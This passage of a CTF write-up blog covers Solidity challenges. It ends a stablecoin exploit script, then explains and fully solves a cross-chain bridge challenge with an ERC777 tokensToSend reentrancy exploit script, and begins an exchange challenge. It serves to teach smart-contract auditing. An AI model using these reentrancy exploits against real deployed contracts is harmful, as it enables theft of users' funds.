        console.log("Manager Owner balance of ETH : ", eth.balanceOf(address(manager.owner())));
        console.log("Manager Owner balance of MIM : ", mim.balanceOf(address(manager.owner())));
        console.log("Manager Owner balance of protocolCollateralToken : ", protocolCollateralToken.balanceOf(address(manager.owner())));
        console.log("Manager Owner balance of protocolDebtToken : ", protocolDebtToken.balanceOf(address(manager.owner())));
        console.log("Player balance of ETH : ", eth.balanceOf(address(player)));
        console.log("Player balance of MIM : ", mim.balanceOf(address(player)));
        console.log("Player balance of protocolCollateralToken : ", protocolCollateralToken.balanceOf(address(player)));
        console.log("Player balance of protocolDebtToken : ", protocolDebtToken.balanceOf(address(player)));
        console.log("protocolCollateralToken Signal: ", protocolCollateralToken.signal());
        console.log("protocolDebtToken Signal : ", protocolDebtToken.signal());
        console.log("-------------------------------");


        console.log("isSolved() : ", stablecoin.isSolved());

        mim.approve(address(manager), type(uint256).max );
        eth.approve(address(manager), type(uint256).max );
        manager.manage(eth, 2.1 ether, true, 3521 ether, true);
        eth.transfer(address(manager), 5990 ether);
        manager.liquidate(manager.owner());
        for (uint i = 0; i < 850; i++){
            manager.manage(eth, 1 , true, 0, false);
        }
        manager.manage(eth, 0 , false, 50_000_000 ether , true);
        mim.transfer(address(0xdeadbeef), mim.balanceOf(player) - 50_000_000 ether);

        
        console.log("-------------------------------");
        console.log("Manager balance of ETH : ", eth.balanceOf(address(manager)));
        console.log("Manager balance of MIM : ", mim.balanceOf(address(manager)));
        console.log("Manager Owner balance of ETH : ", eth.balanceOf(address(manager.owner())));
        console.log("Manager Owner balance of MIM : ", mim.balanceOf(address(manager.owner())));
        console.log("Manager Owner balance of protocolCollateralToken : ", protocolCollateralToken.balanceOf(address(manager.owner())));
        console.log("Manager Owner balance of protocolDebtToken : ", protocolDebtToken.balanceOf(address(manager.owner())));
        console.log("Player balance of ETH : ", eth.balanceOf(address(player)));
        console.log("Player balance of MIM : ", mim.balanceOf(address(player)));
        console.log("Player balance of protocolCollateralToken : ", protocolCollateralToken.balanceOf(address(player)));
        console.log("Player balance of protocolDebtToken : ", protocolDebtToken.balanceOf(address(player)));
        console.log("protocolCollateralToken Signal: ", protocolCollateralToken.signal());
        console.log("protocolDebtToken Signal : ", protocolDebtToken.signal());
        console.log("-------------------------------");

        console.log("isSolved() : ", stablecoin.isSolved());
        // revert();
    }

}
```
{%end%}
***

# Bridge

P: "You've stumbled upon a cross-chain bridge contract, enabling ETH and ERC20 token transfers between chains. The Bridge contract has 100 ether of flag token. You are given 1 ether of flag token. Your goal is to drain Bridge contract below 90 ether."

{% note(clickable=true, header="Bridge.sol") %}

```solidity
//SPDX-License-Identifier:MIT
pragma solidity ^0.8.20;

import {Address} from "@openzeppelin-contracts-4.8.0/contracts/utils/Address.sol";
import {IERC20, IERC20Metadata} from "@openzeppelin-contracts-4.8.0/contracts/token/ERC20/extensions/IERC20Metadata.sol";
import {ERC20} from "@openzeppelin-contracts-4.8.0/contracts/token/ERC20/ERC20.sol";
import {ERC777} from "@openzeppelin-contracts-4.8.0/contracts/token/ERC777/ERC777.sol";

contract Bridge {
    uint256 public immutable CHAIN_ID;
    address public immutable FLAG_TOKEN;
    address public relayer;
    mapping(uint256 => address) public remoteBridge;
    mapping(address => uint256) public remoteBridgeChainId;
    mapping(uint256 => mapping(address => bool)) public isTokenRegisteredAtRemote;

    uint256 internal msgNonce;
    mapping(bytes32 => bool) public relayedMessages;
    uint256 public relayedMessageSenderChainId;
    address public relayedMessageSenderAddress;
    mapping(address => address) public remoteTokenToLocalToken;
    mapping(address => bool) public isBridgedERC20;

    event SendRemoteMessage(
        uint256 indexed targetChainId,
        address indexed targetAddress,
        address indexed sourceAddress,
        uint256 msgValue,
        uint256 msgNonce,
        bytes msgData
    );
    event RelayedMessage(bytes32 indexed msgHash);

    event ETH_transfer(address indexed to, uint256 amount);
    event ERC20_register(address indexed token, string name, string symbol);
    event ERC20_transfer(address indexed token, address indexed to, uint256 amount);

    constructor(address _relayer, address flagToken, uint256 chainId) {
        relayer = _relayer;
        FLAG_TOKEN = flagToken;
        CHAIN_ID = chainId;
    }

    modifier onlyRelayer() {
        require(msg.sender == relayer, "R");
        _;
    }

    modifier onlyRemoteBridge() {
        uint256 senderChainId = Bridge(payable(msg.sender)).relayedMessageSenderChainId();
        require(
            msg.sender == remoteBridge[senderChainId] && senderChainId != 0
                && remoteBridgeChainId[msg.sender] == senderChainId,
            "RB"
        );
        _;
    }

    function isSolved() external view returns (bool) {
        return IERC20(FLAG_TOKEN).balanceOf(address(this)) < 90 ether;
    }

    function registerRemoteBridge(uint256 _remoteChainId, address _remoteBridge) external onlyRelayer {
        remoteBridge[_remoteChainId] = _remoteBridge;
        remoteBridgeChainId[_remoteBridge] = _remoteChainId;
    }

    receive() external payable virtual {
        require(msg.sender == tx.origin, "Only EOA");
        ethOut(msg.sender);
    }

    function ethOut(address _to) public payable virtual {
        emit ETH_transfer(_to, msg.value);
        uint256 _remoteChainId = CHAIN_ID == 1 ? 2 : 1;
        address _remoteBridge = remoteBridge[_remoteChainId];
        this.sendRemoteMessage{value: msg.value}(
            _remoteChainId, _remoteBridge, abi.encodeWithSelector(Bridge.ethIn.selector, _to)
        );
    }

    function ethIn(address _to) external payable onlyRemoteBridge {
        emit ETH_transfer(_to, msg.value);
        Address.sendValue(payable(_to), msg.value);
    }

    function ERC20Out(address _token, address _to, uint256 _amount) external {
        emit ERC20_transfer(_token, _to, _amount);

        uint256 _remoteChainId = CHAIN_ID == 1 ? 2 : 1;
        address _remoteBridge = remoteBridge[_remoteChainId];

        if (isBridgedERC20[_token]) {
            BridgedERC20(_token).burn(msg.sender, _amount);
            _token = BridgedERC20(_token).REMOTE_TOKEN();
        } else {
            uint256 balance = IERC20(_token).balanceOf(address(this));
            require(IERC20(_token).transferFrom(msg.sender, address(this), _amount), "T");
            _amount = IERC20(_token).balanceOf(address(this)) - balance;
            if (!isTokenRegisteredAtRemote[_remoteChainId][_token]) {
                this.sendRemoteMessage(
                    _remoteChainId,
                    _remoteBridge,
                    abi.encodeWithSelector(
                        Bridge.ERC20Register.selector,
                        _token,
                        IERC20Metadata(_token).name(),
                        IERC20Metadata(_token).symbol()
                    )
                );
                isTokenRegisteredAtRemote[_remoteChainId][_token] = true;
            }
        }

        this.sendRemoteMessage(
            _remoteChainId, _remoteBridge, abi.encodeWithSelector(Bridge.ERC20In.selector, _token, _to, _amount)
        );
    }

    function ERC20Register(address _remoteToken, string memory _name, string memory _symbol)
        external
        onlyRemoteBridge
    {
        emit ERC20_register(_remoteToken, _name, _symbol);

        if (remoteTokenToLocalToken[_remoteToken] == address(0)) {
            address _token = address(new BridgedERC20(msg.sender, _remoteToken, _name, _symbol));
            remoteTokenToLocalToken[_remoteToken] = _token;
            isBridgedERC20[_token] = true;
        }
    }

    function ERC20In(address _token, address _to, uint256 _amount) external payable onlyRemoteBridge {
        emit ERC20_transfer(_token, _to, _amount);

        if (remoteTokenToLocalToken[_token] != address(0)) {
            BridgedERC20(remoteTokenToLocalToken[_token]).mint(_to, _amount);
        } else {
            require(IERC20(_token).transfer(_to, _amount), "T");
        }
    }

    function sendRemoteMessage(uint256 _targetChainId, address _targetAddress, bytes calldata _message)
        public
        payable
    {
        require(msg.sender == address(this), "S");
        require(_targetChainId != CHAIN_ID, "C");
        require(_targetAddress != address(0), "A");
        emit SendRemoteMessage(_targetChainId, _targetAddress, msg.sender, msg.value, msgNonce, _message);
        
        uint256 _sourceChainId = CHAIN_ID;
        address _sourceAddress = address(this);

        bytes32 h = keccak256(
            abi.encodeWithSignature(
                "relayMessage(address,uint256,address,uint256,uint256,bytes)",
                _targetAddress,
                _sourceChainId,
                _sourceAddress,
                msg.value,
                msgNonce,
                _message
            )
        );
        require(relayedMessages[h] == false, "H");
        relayedMessages[h] = true;
        emit RelayedMessage(h);
        relayedMessageSenderChainId = _sourceChainId;
        relayedMessageSenderAddress = _sourceAddress;
        (bool success, bytes memory result) = _targetAddress.call{value: msg.value}(_message);
        require(success, string(result));
        relayedMessageSenderChainId = 0;
        relayedMessageSenderAddress = address(0);

        unchecked {
            ++msgNonce;
        }
    }
}

contract Token is ERC777 {
    constructor(address user, address[] memory a) ERC777("Token", "Tok", a) {
        _mint(msg.sender, 100 ether, "", "", false);
        _mint(user, 1 ether, "", "", false);
    }
}

contract BridgedERC20 is ERC20 {
    Bridge public immutable BRIDGE;
    Bridge public immutable REMOTE_BRIDGE;
    address public immutable REMOTE_TOKEN;

    modifier onlyBridge() {
        require(msg.sender == address(BRIDGE), "B");
        _;
    }

    modifier onlyRemoteBridge() {
        require(msg.sender == address(BRIDGE), "RB1");
        require(
            REMOTE_BRIDGE.relayedMessageSenderChainId() != 0
                && BRIDGE.remoteBridgeChainId(REMOTE_BRIDGE.relayedMessageSenderAddress()) == REMOTE_BRIDGE.relayedMessageSenderChainId(),
            "RB2"
        );
        _;
    }
    constructor(address _remoteBridge, address _remoteToken, string memory _name, string memory _symbol) ERC20(_name, _symbol) {
        BRIDGE = Bridge(payable(msg.sender));
        REMOTE_BRIDGE = Bridge(payable(_remoteBridge));
        REMOTE_TOKEN = _remoteToken;
    }

    function mint(address _to, uint256 _amount) external onlyRemoteBridge {
        _mint(_to, _amount);
    }

    function burn(address _from, uint256 _amount) external onlyBridge {
        _burn(_from, _amount);
    }
}
```
{%end%}

## Solution

Yes man, bridges.. More interesting and I personally I love bridges. Let's do this as quick as possible. 

Lets, break down the Bridge protocol. 

1. **Bridge (Main Contract)**
   - Handles cross-chain messaging and token transfers
   - Manages remote bridge registrations and token registrations
   - Key functions:
     - `ethOut/ethIn`: Handles ETH transfers between chains
     - `ERC20Out/ERC20In`: Handles ERC20 token transfers
     - `ERC20Register`: Registers new tokens on remote chains
     - `sendRemoteMessage`: Core function for sending messages between chains

2. **BridgedERC20**
   - Special ERC20 token for cross-chain transfers
   - Can only be minted by remote bridge and burned by local bridge
   - Tracks the remote token address and bridge contracts
   - Implements strict access controls for minting/burning

3. **Token**
   - Simple ERC777 token used in the challenge
   - Mints initial tokens to deployer and user

This is not a complete bridge protocol because there is no off-chain componets like relayers, etc. But all the things were replicated in the smart contract itself. 
Because of this it's confusing to understand which one is source contract and which one is destination contract. 

Just follow me, `remoteBridge` means destination bridge, `ethOut()` or `ERC20Out()` means that the source contract is sending to destination contract. 
`ethIn()` or `ERC20In()` are the functions which usually called by off-chain components like relayer but here the source contract directly calls these functions on destination contract. Here `ethIn()` or `ERC20In()` are restricted to be only calleable by the remote bridge. 
`ERC20Register()` is to deploy a equivalent token (wrapped) on the destination for a token on source chain. Here, If the token was not registered the on the first bridging of that token the registration and the deployment of wrapped token will be done automatically. 
The wrapped token which is going to be deployed for a token on source chain is `BridgedERC20` token. Token we are going to bridge is `Token` an `ERC777`. 


Usually asset moving bridges will follow following modes of bridging. 
- **Lock** asset on source chain then **Mint** a wrapped asset on destination
- **Burn** and **Mint**
- **Lock** and **Release**
- **Burn** and **Mint**

Here in this protocol the **Lock** and **Mint** in forward direction and when the same Wrapped token bridged back to source then the **Burn** and **Release** happens. (I'd love to explain all these in a dedicated blog post)

`sendRemoteMessage()` function will log a message to be picked up by the off-chain relayer and send it to destination. But here all this relayer functionality was implemented in this function itself.
It was restricted to be calling from by anyone else except the same contract functions with the following check. If this check was not there
we could've simply call this to perform an attack. But no luck, we can't do this. 

```solidity
require(msg.sender == address(this), "S");
```

But the `sendRemoteMessage()` function is called by the `ethOut()` or `ERC20Out()` and then the call goes to `ethIn()` or `ERC20In()`. 

```
USER -> ethOut()/ERC20Out()  -> sendRemoteMessage() -> ethIn()/ERC20In() -> USER (mint/release tokens)
```

Let's get the initial state of the protocol, 

```bash
Bridge:  0xB4a8227E3312F40Ad03fbe7f747da61266EDC0Ba
FLAG_TOKEN:  0x7a072D0a5C338679Da17C4922C364c03167D1fB2 (ERC777)
Player balance of FLAG :  1000000000000000000
SOURCE Bridge balance of FLAG :  100000000000000000000
SOURCE CHAIN_ID :  1
Total Default operators of FLAG :  0
REMOTE CHAIN_ID :  2
REMOTE Bridge:  0xd73fFbbd87624b59e166717676F0e10135C9fe3B
REMOTE Bridge balance:  0
```

Expected initial data..

How can we bridge the `1e18` of ERC777 Token that we got? By calling `ERC20Out()`

```solidity
function ERC20Out(address _token, address _to, uint256 _amount) external {
        emit ERC20_transfer(_token, _to, _amount);
        uint256 _remoteChainId = CHAIN_ID == 1 ? 2 : 1;
        address _remoteBridge = remoteBridge[_remoteChainId];
        if (isBridgedERC20[_token]) {
            BridgedERC20(_token).burn(msg.sender, _amount);
            _token = BridgedERC20(_token).REMOTE_TOKEN();
        } else {
            uint256 balance = IERC20(_token).balanceOf(address(this));
            require(IERC20(_token).transferFrom(msg.sender, address(this), _amount), "T");
            _amount = IERC20(_token).balanceOf(address(this)) - balance;
            if (!isTokenRegisteredAtRemote[_remoteChainId][_token]) {
                this.sendRemoteMessage(
                    _remoteChainId,
                    _remoteBridge,
                    abi.encodeWithSelector(
                        Bridge.ERC20Register.selector,
                        _token,
                        IERC20Metadata(_token).name(),
                        IERC20Metadata(_token).symbol()
                    )
                );
                isTokenRegisteredAtRemote[_remoteChainId][_token] = true;
            }
        }
        this.sendRemoteMessage(
            _remoteChainId, _remoteBridge, abi.encodeWithSelector(Bridge.ERC20In.selector, _token, _to, _amount)
        );
    }
```

Observing the above function, if the token that we are sending is `BridgedERC20` then the burn happens. If not the lock happens. Nothing exciting in the if block. 
But in the else block the lock of our token happens (ERC777). 

Can you see the problem of these three lines???

```solidity
uint256 balance = IERC20(_token).balanceOf(address(this));
require(IERC20(_token).transferFrom(msg.sender, address(this), _amount), "T");
_amount = IERC20(_token).balanceOf(address(this)) - balance;
```

I can see it.. The `balance` is fetched on line 1 then same balance is used after the `trnasferFrom()` call. What is anybody can **reenter** from that transferFrom call?? With standard ERC20 token transfers it's not possible.
But it is possible from the `ERC777` transfers bacause of an extra feature called Hooks and Callbacks. 

_"Hooks in ERC777 tokens serve as entry points for custom code execution during token transfers. They allow external smart contracts to intervene in the token transfer process, either before or after the transfer occurs. This flexibility is a double-edged sword, as it can be used for legitimate purposes but also exploited for malicious actions."_ - Johny

### ERC777

The following are the functions of ERC777 standard. In the `transferFrom()` the contract will call the 
`_send()` hook, there in the hook if the sender is registered a `IERC777Sender` interface implementer in the `_ERC1820_REGISTRY` contract then the hook will call the `tokensToSend()` function on the implementor. Here the user is the sender but the implementor is someother contract registered by the user as his `IERC777Sender` implementor. Look at the following control flow for better understanding. 

```
User -> Deploys a contract -> Declares the contract as willing to be an implementer 
User -> transferFrom() -> _send() -> _callTokensToSend() -> user Implementor.tokensToSend()
```

Okay, enough reconnaissance. Now we know the it is possible to reenter to back to the `ERC20Out()` function with callback hooks of `ERC777` via the `ERC-1820 registry`,

```solidity
    function transferFrom(
        address holder,
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        address spender = _msgSender();
        _spendAllowance(holder, spender, amount);
        _send(holder, recipient, amount, "", "", false);
        return true;
    }

        function _send(
        address from,
        address to,
        uint256 amount,
        bytes memory userData,
        bytes memory operatorData,
        bool requireReceptionAck
    ) internal virtual {
        require(from != address(0), "ERC777: transfer from the zero address");
        require(to != address(0), "ERC777: transfer to the zero address");

        address operator = _msgSender();

        _callTokensToSend(operator, from, to, amount, userData, operatorData);

        _move(operator, from, to, amount, userData, operatorData);

        _callTokensReceived(operator, from, to, amount, userData, operatorData, requireReceptionAck);
    }

    function _callTokensToSend(
        address operator,
        address from,
        address to,
        uint256 amount,
        bytes memory userData,
        bytes memory operatorData
    ) private {
        address implementer = _ERC1820_REGISTRY.getInterfaceImplementer(from, _TOKENS_SENDER_INTERFACE_HASH);
        if (implementer != address(0)) {
            IERC777Sender(implementer).tokensToSend(operator, from, to, amount, userData, operatorData);
        }
    }
```

### Attack 

- Deploy an Attacker contract and register this attacker contract as the Implementer for the Player.
- Send `0.5 ether` amount of ERC777 tokens to Attack
- Inside `tokensToSend(operator, from, to, amount, userData, operatorData)` function of Attack contract, add the following logic 
    - reenter to the `ERC20Out()` function by sending same `amount` again. 
- Start the attack by calling `ERC20Out()` function with amount `0.5 ether`. 
- The following vulnerable lines of code will execute

    ```solidity
        uint256 balance = IERC20(_token).balanceOf(address(this));  // 100 ether
        require(IERC20(_token).transferFrom(msg.sender, address(this), _amount), "T"); // Call to Attack.tokensToSend()
        _amount = IERC20(_token).balanceOf(address(this)) - balance;
    ```

- Attack contract wil reenter the function with amount `0.5 ether`, but the bridge balance is still 100 ether. 
- Second `tranferFrom` call from Attack will be succeeded and Attack contract will get `0.5 ether` of `BridgedERC20` tokens. Bridge also gets `0.5 ether` of ERC777 tokens.
- First `transferFrom` call completes will get `0.5 ether` of `BridgedERC20` tokens. Bridge also gets `0.5 ether` of ERC777 tokens. Bridge balance is now `101 ether`
- Now on the third line ` _amount = IERC20(_token).balanceOf(address(this)) - balance;` 
    - `_amount = 101 ether - 100 ether = 1 ether`
- Now the  `1 ether` of `BridgedERC20` will be minted to Player. 
- If we bridge these tokens back, `BridgedERC20` will be burned and `ERC777`(FLAG) tokens will be sent to Player.
- After one successfull iteration of these steps we got `0.5 ether` of more tokens than we have. 

Now do you own math and find a way to execute this logic until you got atleast `10 ether` of ERC777 tokens or FLAG tokens. 

Don't look at my following exploit, I did a terrible math there. 


{% note(clickable=true, header="Bridge.s.sol") %}
```solidity
// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.20;
import {Script} from "forge-std/Script.sol";
import {console} from "forge-std/console.sol";
import {Bridge, Token, BridgedERC20} from "../src/Bridge.sol";
import {IERC20, IERC20Metadata} from "@openzeppelin-contracts-4.8.0/contracts/token/ERC20/extensions/IERC20Metadata.sol";
import {IERC777Sender} from "@openzeppelin-contracts-4.8.0/contracts/token/ERC777/IERC777Sender.sol";
import {IERC1820Registry} from "@openzeppelin-contracts-4.8.0/contracts/utils/introspection/IERC1820Registry.sol";

import {ERC1820Implementer} from "@openzeppelin-contracts-4.8.0/contracts/utils/introspection/ERC1820Implementer.sol";
contract BridgeSolve is Script {
    Bridge public bridge = Bridge(payable(0xB4a8227E3312F40Ad03fbe7f747da61266EDC0Ba));
    Bridge public remoteBridge;
    Token public flagToken;
    
    address public relayer;
    address public player;
    uint256 public CHAIN_ID = 1;
    uint256 public REMOTE_CHAIN_ID = 2;
    IERC1820Registry internal constant _ERC1820_REGISTRY = IERC1820Registry(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24);
    bytes32 private constant _TOKENS_SENDER_INTERFACE_HASH = keccak256("ERC777TokensSender");

    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        player = vm.envAddress("PLAYER");
        console.log("Player : ", player);
        console.log("Player balance: ", player.balance);
        console.log("Bridge: ", address(bridge));
        // console.log("Bridge balance: ", address(bridge).balance);
        flagToken = Token(bridge.FLAG_TOKEN());
        // relayer = bridge.relayer();
        console.log("FLAG_TOKEN: ", address(flagToken));
        console.log("Player balance of FLAG : ", flagToken.balanceOf(player));
        console.log("SOURCE Bridge balance of FLAG : ", flagToken.balanceOf(address(bridge)));
        console.log("SOURCE CHAIN_ID : ", CHAIN_ID);
        // console.log("isSolved(): ", bridge.isSolved());
        console.log("Total Default operators of FLAG : ", flagToken.defaultOperators().length); // NO operators
        // console.log("Relayer: ", relayer);
        remoteBridge = Bridge(payable(bridge.remoteBridge(REMOTE_CHAIN_ID)));
        console.log("REMOTE CHAIN_ID : ", REMOTE_CHAIN_ID);
        console.log("REMOTE Bridge: ", address(remoteBridge));
        console.log("REMOTE Bridge balance: ", address(remoteBridge).balance);
        Attack attack = new Attack(address(bridge), /*address(bridgedToken)*/ address(flagToken), player);
        console.log("Attack : ", address(attack));
       _ERC1820_REGISTRY.setInterfaceImplementer(player, _TOKENS_SENDER_INTERFACE_HASH, address(attack));
        require(attack.isRegister()==address(attack), "Failed to set interface");
        flagToken.approve(address(bridge), type(uint256).max);
        address bridgedToken;
        while (flagToken.balanceOf(address(bridge)) > 89 ether) {
        // for (uint8 i; i <=1; i++){
            uint256 amount = flagToken.balanceOf(address(player))/2;
            flagToken.transfer(address(attack), amount);
            bridge.ERC20Out(address(flagToken), player, amount);
            bridgedToken = remoteBridge.remoteTokenToLocalToken(address(flagToken));
            attack.sendMeback();
            remoteBridge.ERC20Out(bridgedToken, player, BridgedERC20(bridgedToken).balanceOf(player));
        }
        bridgedToken = remoteBridge.remoteTokenToLocalToken(address(flagToken));
        console.log("REMOTE Bridge balance of FLAG : ", flagToken.balanceOf(address(remoteBridge)));
        // console.log("IS FLAG token registed at remote : ", bridge.isTokenRegisteredAtRemote(REMOTE_CHAIN_ID, address(flagToken)));
        // console.log("FLAG token to local token(BridgedERC20) : ", bridgedToken);
        console.log("Player balance of BridgedERC20 : ", BridgedERC20(bridgedToken).balanceOf(player));
        // console.log("Attack balance of BridgedERC20 : ", BridgedERC20(bridgedToken).balanceOf(address(attack)));
        console.log("Player balance of FLAG : ", flagToken.balanceOf(player));
        console.log("SOURCE Bridge balance of FLAG : ", flagToken.balanceOf(address(bridge)));
        console.log("Attack balance of FLAG : ", flagToken.balanceOf(address(attack)));
        console.log("isSolved(): ", bridge.isSolved());
        vm.stopBroadcast();
    }
}

contract Attack is ERC1820Implementer, IERC777Sender {
    // BridgedERC20 public bridgedERC20;
    Bridge public bridge;
    address public flagToken;
    address public player;
    bytes32 private constant _TOKENS_SENDER_INTERFACE_HASH = keccak256("ERC777TokensSender");
    IERC1820Registry internal constant _ERC1820_REGISTRY = IERC1820Registry(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24);

    constructor(address _bridge, /*address _bridgedERC20,*/ address _flagToken, address _player) {
        bridge = Bridge(payable(_bridge));
        // bridgedERC20 = BridgedERC20(_bridgedERC20);
        flagToken = _flagToken;
        player = _player;
        _registerInterfaceForAddress(_TOKENS_SENDER_INTERFACE_HASH, player);
        IERC20(flagToken).approve(address(bridge), type(uint256).max);
    }
    function isRegister() public returns (address implementer){
        implementer = _ERC1820_REGISTRY.getInterfaceImplementer(player, _TOKENS_SENDER_INTERFACE_HASH);
    }
    function sendMeback() external {
        IERC20(flagToken).transfer(player, IERC20(flagToken).balanceOf(address(this)));
    }
    function tokensToSend(
        address operator,
        address from,
        address to,
        uint256 amount,
        bytes calldata userData,
        bytes calldata operatorData
    ) external {
        if ((from == player && to == address(this)) || (from == address(bridge) && to == player)){
            return;
        }
        bridge.ERC20Out(address(flagToken), player, amount);
    }
}
```
{%end%}
***

# Exchange

P: "You heard there is a new Dex primitive that has launched on-chain with a lot of tokens. As a whitehat hacker, you race to find any bugs before the blackhats do. Can you rescue the tokens from the contract?"

{% note(clickable=true, header="Exchange.sol") %}

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.24;

interface SwapCallback {
    function doSwap() external;
}

contract Setup {
    Exchange public immutable exchange = new Exchange();

    uint256 balance1 = 300_000;
    uint256 balance2 = 300_000;
    uint256 balance3 = 600_000;

    Token public token1 = new Token(balance1);
    Token public token2 = new Token(balance2);
    Token public token3 = new Token(balance3);

    constructor() {
        exchange.addToken(address(token1));
        exchange.addToken(address(token2));
        exchange.addToken(address(token3));

        token1.approve(address(exchange), balance1);
        token2.approve(address(exchange), balance2);
        token3.approve(address(exchange), balance3);

        exchange.addLiquidity(address(token1), address(token2), balance1 / 3, balance2 / 3);

        exchange.addLiquidity(address(token1), address(token3), balance1 / 3, balance3 / 3);

        exchange.addLiquidity(address(token2), address(token3), balance2 / 3, balance3 / 3);
    }

    function isSolved() public view returns (bool) {
        return (
            Token(token1).balanceOf(address(exchange)) == 0 && Token(token2).balanceOf(address(exchange)) == 0
                && Token(token3).balanceOf(address(exchange)) == 0
        );
    }
}

contract Exchange {
    struct Pool {
        uint256 leftReserves;
        uint256 rightReserves;
    }

    struct SavedBalance {
        bool initiated;
        uint256 balance;
    }

    struct SwapState {
        bool hasBegun;
        uint256 unsettledTokens;
        mapping(address => int256) positions;
        mapping(address => SavedBalance) savedBalances;
    }

    address public admin;
    uint256 nonce = 0;
    mapping(address => bool) public allowedTokens;
    mapping(uint256 => SwapState) private swapStates;
    mapping(address => mapping(address => Pool)) private pools;

    constructor() {
        admin = msg.sender;
    }

    function addToken(address token) public {
        require(msg.sender == admin, "not admin");
        allowedTokens[token] = true;
    }

    modifier duringSwap() {
        require(swapStates[nonce].hasBegun, "swap not in progress");
        _;
    }

    function getSwapState() internal view returns (SwapState storage) {
        return swapStates[nonce];
    }

    function getPool(address tokenA, address tokenB)
        internal
        view
        returns (address left, address right, Pool storage pool)
    {
        require(tokenA != tokenB);

        if (tokenA < tokenB) {
            left = tokenA;
            right = tokenB;
        } else {
            left = tokenB;
            right = tokenA;
        }

        pool = pools[left][right];
    }

    function getReserves(address token, address other) public view returns (uint256) {
        (address left,, Pool storage pool) = getPool(token, other);
        return token == left ? pool.leftReserves : pool.rightReserves;
    }

    function setReserves(address token, address other, uint256 amount) internal {
        (address left,, Pool storage pool) = getPool(token, other);

        if (token == left) pool.leftReserves = amount;
        else pool.rightReserves = amount;
    }

    function getLiquidity(address left, address right) public view returns (uint256) {
        (,, Pool storage pool) = getPool(left, right);
        return pool.leftReserves * pool.rightReserves;
    }

    function addLiquidity(address left, address right, uint256 amountLeft, uint256 amountRight) public {
        require(allowedTokens[left], "token not allowed");
        require(allowedTokens[right], "token not allowed");

        Token(left).transferFrom(msg.sender, address(this), amountLeft);
        Token(right).transferFrom(msg.sender, address(this), amountRight);

        setReserves(left, right, getReserves(left, right) + amountLeft);
        setReserves(right, left, getReserves(right, left) + amountRight);
    }

    function swap() external {
        SwapState storage swapState = getSwapState();

        require(!swapState.hasBegun, "swap already in progress");
        swapState.hasBegun = true;

        SwapCallback(msg.sender).doSwap();

        require(swapState.unsettledTokens == 0, "not settled");
        nonce += 1;
    }

    function updatePosition(address token, int256 amount) internal {
        require(allowedTokens[token], "token not allowed");

        SwapState storage swapState = getSwapState();

        int256 currentPosition = swapState.positions[token];
        int256 newPosition = currentPosition + amount;

        if (newPosition == 0) swapState.unsettledTokens -= 1;
        else if (currentPosition == 0) swapState.unsettledTokens += 1;

        swapState.positions[token] = newPosition;
    }

    function withdraw(address token, uint256 amount) public duringSwap {
        require(allowedTokens[token], "token not allowed");

        Token(token).transfer(msg.sender, amount);
        updatePosition(token, -int256(amount));
    }

    function initiateTransfer(address token) public duringSwap {
        require(allowedTokens[token], "token not allowed");

        SwapState storage swapState = getSwapState();
        SavedBalance storage state = swapState.savedBalances[token];

        require(!state.initiated, "transfer already initiated");

        state.initiated = true;
        state.balance = Token(token).balanceOf(address(this));
    }

    function finalizeTransfer(address token) public duringSwap {
        require(allowedTokens[token], "token not allowed");

        SwapState storage swapState = getSwapState();
        SavedBalance storage state = swapState.savedBalances[token];

        require(state.initiated, "transfer not initiated");

        uint256 balance = Token(token).balanceOf(address(this));
        uint256 amount = balance - state.balance;

        state.initiated = false;
        updatePosition(token, int256(amount));
    }

    function swapTokens(address tokenIn, address tokenOut, uint256 amountIn, uint256 amountOut) public duringSwap {
        require(allowedTokens[tokenIn], "token not allowed");
        require(allowedTokens[tokenOut], "token not allowed");

        uint256 liquidityBefore = getLiquidity(tokenIn, tokenOut);

        require(liquidityBefore > 0, "no liquidity");

        uint256 newReservesIn = getReserves(tokenIn, tokenOut) + amountIn;
        uint256 newReservesOut = getReserves(tokenOut, tokenIn) - amountOut;

        setReserves(tokenIn, tokenOut, newReservesIn);
        setReserves(tokenOut, tokenIn, newReservesOut);

        uint256 liquidityAfter = getLiquidity(tokenIn, tokenOut);

        updatePosition(tokenIn, -int256(amountIn));
        updatePosition(tokenOut, int256(amountOut));

        require(liquidityAfter >= liquidityBefore, "insufficient liquidity");
    }
}

contract Token {
    uint256 public totalSupply;
    mapping(address => uint256) balances;
    mapping(address => mapping(address => uint256)) allowed;

    constructor(uint256 _initialAmount) {
        balances[msg.sender] = _initialAmount;
        totalSupply = _initialAmount;
    }

    function balanceOf(address _owner) public view returns (uint256) {
        return balances[_owner];
    }

    function transfer(address _to, uint256 _value) public returns (bool) {
        require(balances[msg.sender] >= _value);
        balances[msg.sender] -= _value;
        balances[_to] += _value;
        return true;
    }

    function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {
        require(allowed[_from][msg.sender] >= _value);
        require(balances[_from] >= _value);
        balances[_to] += _value;
        balances[_from] -= _value;
        allowed[_from][msg.sender] -= _value;
        return true;
    }

    function approve(address _spender, uint256 _value) public returns (bool) {
        allowed[msg.sender][_spender] = _value;
        return true;
    }
}
```
{%end%}

## Solution

What does this protocol is doing? Let's break it down

1. **Setup Contract**
   - Initializes the exchange with initial liquidity
   - Creates three tokens (token1, token2, token3) with balances:
     - token1: 300,000 tokens
     - token2: 300,000 tokens
     - token3: 600,000 tokens
   - Adds initial liquidity pairs:
     - token1/token2: 100,000 each
     - token1/token3: 100,000/200,000
     - token2/token3: 100,000/200,000

2. **Exchange Contract**
   - Core DEX functionality with unique swap mechanism
   - Key components:
     - `Pool`: Tracks reserves for token pairs
     - `SwapState`: Manages ongoing swap states and positions
     - `SavedBalance`: Tracks balance snapshots during swaps
   - Main functions:
     - `addLiquidity()`: Add tokens to pools
     - `swap()`: Initiates a swap transaction
     - `swapTokens()`: Performs the actual token swap
     - `withdraw()`: Withdraws tokens during a swap
     - `initiateTransfer/finalizeTransfer`: Two-step transfer process

As usual what's the initial state of the protocol??

```bash
Player :  0xa7048127553Ead5D0408B3C8C068565d1cD46BDb
Setup :  0xd9beE8f7dF07fd718f54ed05CAD77FC0EF1F9A7B
Exchange :  0xb3CE3E482D1caf5b444f3f6b95a9d8799f6dac11
Token1 :  0xa95A2a693880626911bb521CB50b7DC7Caa0EC05
